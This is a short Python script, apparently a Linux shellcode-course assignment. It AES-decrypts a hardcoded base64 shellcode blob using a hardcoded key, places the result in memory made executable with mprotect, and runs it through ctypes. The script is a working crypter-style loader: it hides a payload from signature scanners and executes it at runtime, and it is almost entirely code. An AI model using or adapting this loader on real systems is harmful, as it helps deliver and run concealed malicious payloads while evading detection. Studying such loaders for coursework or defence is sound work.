#!/usr/bin/env python

# SLAE - Assignment 7 - Shellcode Decrypt and Execute
# Python script to decrypt shellcode and execute it
# Author: Billy (@_hAxel)


import base64

from ctypes import *
from Crypto import Random
from Crypto.Cipher import AES

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]


class AESCipher:

    def __init__( self, key ):
        self.key = key

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))


cipher = AESCipher('mysecretpassword')
encrypted =  "aol8eQneg/o6s0e+uu87CDgw1tbTgzCTz0Fs6CgEuGf16gehTxmXh3mnatUC9VqU" # Base64 encoded AES encrypted string provided by SLAEencrypt.py
Decrypted_shellcode = cipher.decrypt(encrypted)

print("Running decrypted shellcode now...");print(" ")
libc = CDLL('libc.so.6')
sc = c_char_p(Decrypted_shellcode)
size = len(Decrypted_shellcode)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
